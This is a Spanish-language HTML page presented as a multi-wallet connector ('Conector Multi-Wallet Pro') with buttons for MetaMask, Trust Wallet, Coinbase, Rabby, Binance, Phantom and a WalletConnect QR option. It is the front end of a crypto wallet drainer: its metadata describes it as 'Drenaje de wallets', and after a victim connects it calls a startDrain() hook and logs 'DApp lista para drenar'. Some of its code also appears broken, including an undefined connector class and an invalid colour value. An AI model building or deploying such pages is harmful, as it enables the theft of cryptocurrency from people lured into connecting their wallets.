<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conector Multi-Wallet Pro</title>
    <!-- SDK de WalletConnect para los QRs -->
    <script src="https://unpkg.com/@walletconnect/modal-sign-js@latest/dist/index.js"></script>
    
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #121212; color: white; padding: 20px; }
        .container { max-width: 450px; margin: 0 auto; }
        h2 { text-align: center; margin-bottom: 30px; }
        
        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px; transition: opacity 0.2s; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        
        /* Colores Oficiales */
        .mm { background: #F6851B; color: white; }
        .trust { background: #3375BB; color: white; }
        .coinbase { background: #0052FF; color: white; }
        .rabby { background: #6A6BFF; color: white; }
        .binance { background: #FCD535; color: black; }
        .phantom { background: linear-gradient(135deg, #AB9FFFC 0%, #E8B3E5 100%); color: black; }
        .wc { background: #3b99fc; color: white; }

        #status { text-align: center; margin-top: 20px; color: #888; font-size: 14px; }
        .qr-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .qr-box { background: white; padding: 20px; border-radius: 12px; text-align: center; color: black; }
        .close-btn { margin-top: 15px; padding: 8px 16px; background: #333; color: white; border: none; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>

<div class="container">
    <h2>Conecta tu Wallet</h2>

    <!-- Botones de Deep Linking (Móvil) / Native (PC) -->
    <button class="btn mm" onclick="connectMetaMask()">🦊 MetaMask</button>
    <button class="btn trust" onclick="connectTrustWallet()">🔵 Trust Wallet</button>
    <button class="btn coinbase" onclick="connectCoinbase()">⚪ Coinbase Wallet</button>
    <button class="btn rabby" onclick="connectRabby()">💎 Rabby</button>
    <button class="btn binance" onclick="connectBinance()">🟡 Binance</button>
    <button class="btn phantom" onclick="connectPhantom()">👻 Phantom</button>
    
    <!-- Opcional: QR para Mobile o fallback en PC -->
    <button class="btn wc" id="wcBtn">📱 Escanear Código QR</button>
</div>

<div id="status">Detectando entorno...</div>

<!-- Modal QR -->
<div id="qrModal" class="qr-modal">
    <div class="qr-box">
        <h3>Escanea con tu App</h3>
        <div id="wcmContainer"></div>
        <button class="close-btn" onclick="document.getElementById('qrModal').style.display='none'">Cerrar</button>
    </div>
</div>

<script>
    const statusEl = document.getElementById('status');
    let currentConnector = null;

    // 1. DETECCIÓN DE ENTORNO
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const isDesktop = !isMobile;

    if (isDesktop) {
        statusEl.innerText = "Modo PC: Buscando extensiones...";
    } else {
        statusEl.innerText = "Modo Móvil: Preparado para abrir Apps.";
    }

    // --- LÓGICA DE CONEXIÓN PROFUNDA (DEEP LINKING) ---

    function connectMetaMask() {
        if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
            return nativeConnect();
        }
        // Deep link universal para abrir la app
        window.location.href = `https://go.metamask.io/?redirectUrl=${encodeURIComponent(window.location.href)}`;
    }

    function connectTrustWallet() {
        if (window.trustweb3provider) {
            return nativeConnect();
        }
        // Deep link oficial
        window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(window.location.href)}`;
    }

    function connectCoinbase() {
        if (window.coinbaseWalletExtension) {
            return nativeConnect();
        }
        // Usa deep link universal
        window.location.href = `https://cb.id/${window.location.host}?redirectUrl=${encodeURIComponent(window.location.href)}`;
    }

    function connectRabby() {
        if (window.ethereum && window.ethereum.isRabby) {
            return nativeConnect();
        }
        // Rabby usa un esquema similar a MetaMask pero suele requerir redirección segura
        window.location.href = `https://rabby.io/wallet?dapp=${encodeURIComponent(window.location.host)}`;
    }

    function connectBinance() {
        if (window.bnbWallet) {
            return nativeConnect();
        }
        // Open URL scheme
        window.location.href = `https://www.binance.com/es/open?url=${encodeURIComponent(window.location.href)}`;
    }

    function connectPhantom() {
        if (window.phantom?.ethereum) {
            return nativeConnect();
        }
        window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
    }

    // --- CONEXIÓN NATIVA (CUANDO LA EXTENSIÓN ESTÁ INSTALADA) ---
    async function nativeConnect() {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            handleConnection(accounts[0]);
        } catch (err) {
            console.error(err);
        }
    }

    // --- LÓGICA WALLETCONNECT (PARA QR EN PC O FALLBACK) ---
    async function initWC() {
        try {
            const connector = new WindowConnector({
                projectId: "TU_PROJECT_ID_AQUI", 
                chains: [1],
                rpcMap: { 1: "https://rpc.ankr.com/eth" },
                metadata: { name: "Tu DApp", description: "Drenaje de wallets", url: window.location.href, icons: [""] }
            });

            await connector.connect();
            
            // Listener para cuando se conectan desde el móvil vía QR
            connector.on("connect", (error, provider) => {
                if (provider) window.ethereum = provider;
            });
            
            currentConnector = connector;
            
            // Botón para mostrar QR
            document.getElementById('wcBtn').onclick = async () => {
                if (!currentConnector.connected) {
                    await currentConnector.connect();
                }
                document.getElementById('qrModal').style.display = 'flex';
                // Renderizar QR aquí si el SDK lo soporta directamente, o usar modal estándar
            };

        } catch (e) {
            console.error("Error WC:", e);
        }
    }

    // --- MANEJO FINAL DE CONEXIÓN ---
    function handleConnection(address) {
        statusEl.innerText = `✅ Conectado: ${address.substring(0,6)}...${address.substring(38)}`;
        statusEl.style.color = "#4CAF50";
        
        // AQUÍ ES DONDE SE EJECUTA TU FUNCIÓN CRÍTICA
        if (typeof startDrain === 'function') {
            startDrain();
        } else {
            console.log("DApp lista para drenar.");
        }
    }

    // Iniciar detección inicial
    initWC();
</script>

</body>
</html>
